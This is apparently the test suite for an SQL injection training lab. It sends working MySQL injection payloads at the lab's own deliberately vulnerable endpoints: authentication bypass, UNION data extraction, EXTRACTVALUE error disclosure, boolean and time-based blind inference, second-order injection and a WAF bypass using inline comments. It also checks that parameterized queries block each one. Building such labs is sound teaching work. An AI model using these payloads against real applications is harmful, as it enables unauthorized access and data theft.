"""Comprehensive automated test suite for SQLi-AttackLab.

Verifies:
- HTTP route availability for all lab views and REST endpoints.
- Module 1 (Authentication Bypass) offensive vectors and prepared defenses.
- Module 2 (Union Extraction) column counting, schema dumping, flag harvesting, and remediation.
- Module 3 (Error-Based & Blind/Time-Based Inference) XPath disclosure, boolean/time blind oracles.
- Module 4 (Second-Order, WAF Evasion, SAST Remediation & OWASP Compliance).
- MySQL query audit logging telemetry.
"""

from typing import Any, Dict
from app import app

def run_all_tests() -> None:
    """Executes end-to-end integration and API test assertions."""
    client = app.test_client()

    print("[*] Running Complete 4-Module Verification Suite (18 Tests)...\n")

    # 1. Navigation & View Endpoints
    print("[+] [TEST 1/18] Verifying Web View Routes...")
    for route in ['/', '/lab/auth-bypass', '/lab/union-based', '/lab/error-blind', '/lab/evasion-audit']:
        res = client.get(route)
        assert res.status_code == 200, f"Route {route} failed with status {res.status_code}"
    print("    -> All web lab views returned HTTP 200 OK.")

    # 2. Module 1: Vulnerable Tautology Bypass
    print("\n[+] [TEST 2/18] Module 1: Testing Tautology Auth Bypass (' OR 1=1 -- )...")
    res = client.post('/api/auth/test', json={
        'username': "' OR 1=1 -- ",
        'password': 'any',
        'scenario': 'tautology',
        'mode': 'vulnerable'
    })
    assert res.status_code == 200
    data: Dict[str, Any] = res.get_json()
    assert data.get('success') is True, "Auth bypass should succeed in vulnerable mode"
    assert data.get('bypassed') is True, "Bypassed flag must be True"
    assert data.get('user_profile', {}).get('username') == 'admin', "Compromised user must be admin"
    assert "FLAG{mysql_auth_tautology_bypass_mastered}" in str(data.get('flag')), "Admin breach must award flag"
    print(f"    -> Successfully breached admin account. Flag: {data.get('flag')}")

    # 3. Module 1: Secure Mode Parameterization
    print("\n[+] [TEST 3/18] Module 1: Testing Parameterized Defense against Auth Bypass...")
    res = client.post('/api/auth/test', json={
        'username': "' OR 1=1 -- ",
        'password': 'any',
        'scenario': 'tautology',
        'mode': 'secure'
    })
    data = res.get_json()
    assert data.get('success') is False, "Prepared statement must safely reject injection"
    print("    -> Parameterized query successfully neutralized attack payload.")

    # 4. Module 2: Standard Catalog Query
    print("\n[+] [TEST 4/18] Module 2: Testing Standard Product Catalog Query...")
    res = client.post('/api/union/search', json={
        'category': 'Hardware',
        'scenario': 'column_counting',
        'mode': 'vulnerable'
    })
    data = res.get_json()
    assert data.get('success') is True
    assert data.get('row_count') == 3, f"Expected 3 public hardware items, got {data.get('row_count')}"
    print(f"    -> Standard query returned {data.get('row_count')} records.")

    # 5. Module 2: Column Count Discovery (ORDER BY 5 vs ORDER BY 6)
    print("\n[+] [TEST 5/18] Module 2: Testing Column Counting (ORDER BY 5 valid vs ORDER BY 6 error)...")
    res_valid = client.post('/api/union/search', json={
        'category': "Hardware' ORDER BY 5 -- ",
        'scenario': 'column_counting',
        'mode': 'vulnerable'
    })
    assert res_valid.get_json().get('success') is True, "ORDER BY 5 must succeed"

    res_invalid = client.post('/api/union/search', json={
        'category': "Hardware' ORDER BY 6 -- ",
        'scenario': 'column_counting',
        'mode': 'vulnerable'
    })
    inv_data = res_invalid.get_json()
    assert inv_data.get('success') is False, "ORDER BY 6 must raise column limit error"
    assert inv_data.get('mysql_error_code') == 1054, f"Expected error code 1054, got {inv_data.get('mysql_error_code')}"
    print("    -> ORDER BY 5 succeeded; ORDER BY 6 correctly triggered MySQL Error 1054.")

    # 6. Module 2: Column Projection Mismatch (UNION SELECT NULL, NULL -> Error 1222)
    print("\n[+] [TEST 6/18] Module 2: Testing Column Projection Mismatch (UNION Error 1222)...")
    res_mismatch = client.post('/api/union/search', json={
        'category': "' UNION SELECT NULL, NULL -- ",
        'scenario': 'column_counting',
        'mode': 'vulnerable'
    })
    mis_data = res_mismatch.get_json()
    assert mis_data.get('success') is False
    assert mis_data.get('mysql_error_code') == 1222, f"Expected error code 1222, got {mis_data.get('mysql_error_code')}"
    print("    -> Incompatible projection correctly triggered MySQL Error 1222 (Different column count).")

    # 7. Module 2: Confidential Data & Flag Exfiltration
    print("\n[+] [TEST 7/18] Module 2: Testing UNION Data Exfiltration & Challenge Flag...")
    res_exfil = client.post('/api/union/search', json={
        'category': "' UNION SELECT id, secret_name, classification, 0, secret_value FROM system_secrets -- ",
        'scenario': 'schema_enumeration',
        'mode': 'vulnerable'
    })
    exfil_data = res_exfil.get_json()
    assert exfil_data.get('success') is True, "UNION exfiltration query must execute"
    assert exfil_data.get('exfiltrated') is True, "Exfiltrated status must be True"
    assert "FLAG{mysql_information_schema_exfiltration_pwned}" in str(exfil_data.get('flag')), "Flag must be extracted"
    print(f"    -> Data exfiltration successful! Flag awarded: {exfil_data.get('flag')}")

    # 8. Module 2: Remediated Parameterized Mode
    print("\n[+] [TEST 8/18] Module 2: Testing Remediated Parameterized Query against UNION Injection...")
    res_sec = client.post('/api/union/search', json={
        'category': "' UNION SELECT id, secret_name, classification, 0, secret_value FROM system_secrets -- ",
        'scenario': 'schema_enumeration',
        'mode': 'secure'
    })
    sec_data = res_sec.get_json()
    assert sec_data.get('success') is True
    assert sec_data.get('row_count') == 0, "Prepared statement must yield 0 records for injection string"
    assert sec_data.get('exfiltrated') is False
    print("    -> Parameterized query safely treated attack payload as literal value.")

    # 9. Module 3: Standard User Lookup Query
    print("\n[+] [TEST 9/18] Module 3: Testing Standard User Directory Query...")
    res_u = client.post('/api/error-blind/query', json={
        'username': 'admin',
        'scenario': 'xpath_error',
        'mode': 'vulnerable'
    })
    u_data = res_u.get_json()
    assert u_data.get('success') is True
    assert u_data.get('user_found') is True
    assert len(u_data.get('results', [])) == 1
    assert u_data.get('results')[0]['username'] == 'admin'
    print("    -> Standard lookup returned admin profile correctly.")

    # 10. Module 3: XPath Error Disclosure (EXTRACTVALUE Error 1105)
    print("\n[+] [TEST 10/18] Module 3: Testing XPath Error Disclosure (EXTRACTVALUE Error 1105)...")
    res_xpath = client.post('/api/error-blind/query', json={
        'username': "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) -- ",
        'scenario': 'xpath_error',
        'mode': 'vulnerable'
    })
    xpath_data = res_xpath.get_json()
    assert xpath_data.get('success') is False
    assert xpath_data.get('mysql_error_code') == 1105, f"Expected error 1105, got {xpath_data.get('mysql_error_code')}"
    assert xpath_data.get('leaked_data') is not None, "Leaked version string must be parsed from error"
    print(f"    -> XPath error triggered successfully. Leaked subquery output: {xpath_data.get('leaked_data')}")

    # 11. Module 3: Confidential Flag Exfiltration via Error Disclosure
    print("\n[+] [TEST 11/18] Module 3: Testing Secret Flag Exfiltration via Error 1105...")
    res_flag = client.post('/api/error-blind/query', json={
        'username': "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT secret_value FROM system_secrets WHERE secret_name='FLAG_BLIND_EXPLOIT'), 0x7e)) -- ",
        'scenario': 'xpath_error',
        'mode': 'vulnerable'
    })
    flag_data = res_flag.get_json()
    assert flag_data.get('exfiltrated') is True
    assert "FLAG{mysql_blind_and_error_inference_pwned}" in str(flag_data.get('flag'))
    print(f"    -> Flag exfiltration successful! Flag: {flag_data.get('flag')}")

    # 12. Module 3: Boolean-Based Blind Inference (True vs False differential)
    print("\n[+] [TEST 12/18] Module 3: Testing Boolean Blind Inference (True vs False Oracle)...")
    res_b_true = client.post('/api/error-blind/query', json={
        'username': "admin' AND ASCII(SUBSTRING((SELECT database()), 1, 1)) = 115 -- ",
        'scenario': 'boolean_blind',
        'mode': 'vulnerable'
    })
    b_true_data = res_b_true.get_json()
    assert b_true_data.get('success') is True
    assert b_true_data.get('boolean_state') is True, "Oracle must evaluate to TRUE for correct byte (115)"
    assert b_true_data.get('row_count') == 1

    res_b_false = client.post('/api/error-blind/query', json={
        'username': "admin' AND ASCII(SUBSTRING((SELECT database()), 1, 1)) = 99 -- ",
        'scenario': 'boolean_blind',
        'mode': 'vulnerable'
    })
    b_false_data = res_b_false.get_json()
    assert b_false_data.get('success') is True
    assert b_false_data.get('boolean_state') is False, "Oracle must evaluate to FALSE for incorrect byte (99)"
    assert b_false_data.get('row_count') == 0
    print("    -> Differential oracle confirmed: True predicate returned 1 row; False predicate returned 0 rows.")

    # 13. Module 3: Time-Based Side-Channel & Prepared Statement Neutralization
    print("\n[+] [TEST 13/18] Module 3: Testing Time-Based Delays & Parameterized Defense...")
    res_time = client.post('/api/error-blind/query', json={
        'username': "admin' AND IF(1=1, SLEEP(1), 0) -- ",
        'scenario': 'time_blind',
        'mode': 'vulnerable'
    })
    time_data = res_time.get_json()
    assert time_data.get('sleep_detected') is True, f"Sleep should be detected, elapsed: {time_data.get('execution_time_ms')}ms"
    assert time_data.get('execution_time_ms') >= 1000.0

    res_time_sec = client.post('/api/error-blind/query', json={
        'username': "admin' AND IF(1=1, SLEEP(1), 0) -- ",
        'scenario': 'time_blind',
        'mode': 'secure'
    })
    sec_time_data = res_time_sec.get_json()
    assert sec_time_data.get('sleep_detected') is False, "Prepared statement must neutralize SLEEP() payload"
    assert sec_time_data.get('execution_time_ms') < 500.0, "Secure mode must respond without sleep delay"
    print(f"    -> Time-based blind verified: Vulnerable delayed {time_data.get('execution_time_ms')}ms; Prepared neutralized delay to {sec_time_data.get('execution_time_ms')}ms.")

    # 14. Module 4: Second-Order SQLi Storage & Delayed Trigger
    print("\n[+] [TEST 14/18] Module 4: Testing Second-Order SQLi (Safe Storage & Trigger Phase)...")
    res_save = client.post('/api/profile/save', json={
        'username': 'attacker_bot',
        'display_name': "admin' -- ",
        'bio': 'Second order test'
    })
    assert res_save.get_json().get('success') is True, "First-order storage must succeed"

    res_audit_vuln = client.post('/api/profile/audit', json={
        'username': 'attacker_bot',
        'mode': 'vulnerable'
    })
    audit_data = res_audit_vuln.get_json()
    assert audit_data.get('success') is True
    assert audit_data.get('bypassed') is True, "Second order injection must bypass and compromise account"
    assert "FLAG{mysql_second_order_stored_sqli_pwned}" in str(audit_data.get('flag'))
    print(f"    -> Second-order injection confirmed! Triggered delayed execution. Flag: {audit_data.get('flag')}")

    # 15. Module 4: Second-Order Parameterized Defense
    print("\n[+] [TEST 15/18] Module 4: Testing Second-Order Parameterized Query Defense...")
    res_audit_sec = client.post('/api/profile/audit', json={
        'username': 'attacker_bot',
        'mode': 'secure'
    })
    audit_sec_data = res_audit_sec.get_json()
    assert audit_sec_data.get('success') is True
    assert audit_sec_data.get('bypassed') is False, "Prepared statement must neutralize second-order trigger"
    print("    -> Parameterized read query neutralized stored injection payload.")

    # 16. Module 4: WAF Filter Sandbox (Space Block vs /**/ Bypass)
    print("\n[+] [TEST 16/18] Module 4: Testing WAF Filter Rule & Comment Evasion (/**/)...")
    res_waf_block = client.post('/api/waf/test', json={
        'payload': "' OR 1=1 -- ",
        'filter_profile': 'spaces',
        'mode': 'vulnerable'
    })
    assert res_waf_block.get_json().get('waf_blocked') is True, "WAF must block raw spaces"

    res_waf_bypass = client.post('/api/waf/test', json={
        'payload': "'/**/OR/**/'1'='1",
        'filter_profile': 'spaces',
        'mode': 'vulnerable'
    })
    waf_b_data = res_waf_bypass.get_json()
    assert waf_b_data.get('waf_blocked') is False, "Inline comments must evade whitespace filter"
    assert waf_b_data.get('bypassed') is True
    assert "FLAG{mysql_waf_filter_bypass_mastered}" in str(waf_b_data.get('flag'))
    print(f"    -> WAF whitespace filter evaded via /**/. Flag: {waf_b_data.get('flag')}")

    # 17. Module 4: SAST Static Code Linter & Auto-Fix
    print("\n[+] [TEST 17/18] Module 4: Testing SAST Query Linter & Auto-Fix Generation...")
    vulnerable_code = "query = f\"SELECT * FROM users WHERE username = '{username}'\""
    res_sast = client.post('/api/sast/audit', json={'code_snippet': vulnerable_code})
    sast_data = res_sast.get_json()
    assert sast_data.get('is_vulnerable') is True
    assert sast_data.get('total_findings') == 1
    assert "Prepared Statement" in sast_data.get('auto_remediated_code')
    print("    -> SAST linter detected f-string concatenation and generated parameterized auto-fix.")

    # 18. Module 4: Full Security Compliance Report
    print("\n[+] [TEST 18/18] Module 4: Testing OWASP Compliance Report Generation...")
    res_rep = client.get('/api/compliance/report')
    rep_data = res_rep.get_json()
    assert "OWASP Top 10 - A03:2021 (Injection)" in rep_data.get('standard_alignment')
    assert rep_data.get('telemetry', {}).get('total_queries_logged') > 0
    print(f"    -> Compliance report generated. Total logged queries: {rep_data.get('telemetry', {}).get('total_queries_logged')}")

    # Telemetry Audit Log Check
    print("\n[+] Verifying Complete 4-Module MySQL Audit Logging Telemetry...")
    res_logs = client.get('/api/audit-logs')
    logs = res_logs.get_json().get('logs', [])
    assert len(logs) > 0, "Audit logs must contain recorded queries"
    modules_in_logs = {log.get('lab_module') for log in logs}
    assert "Module 1: Auth Bypass" in modules_in_logs, "Module 1 queries must be audited"
    assert "Module 2: Union Extraction" in modules_in_logs, "Module 2 queries must be audited"
    assert "Module 3: Error & Blind Inference" in modules_in_logs, "Module 3 queries must be audited"
    assert "Module 4: Second-Order SQLi" in modules_in_logs or "Module 4: WAF Sandbox" in modules_in_logs, "Module 4 queries must be audited"
    print(f"    -> All 4 laboratory modules verified in audit telemetry ({len(logs)} queries logged).")

    print("\n" + "="*60)
    print("[SUCCESS] ALL 18 TESTS PASSED SUCCESSFULLY! ZERO REGRESSIONS DETECTED.")
    print("="*60 + "\n")

if __name__ == "__main__":
    run_all_tests()
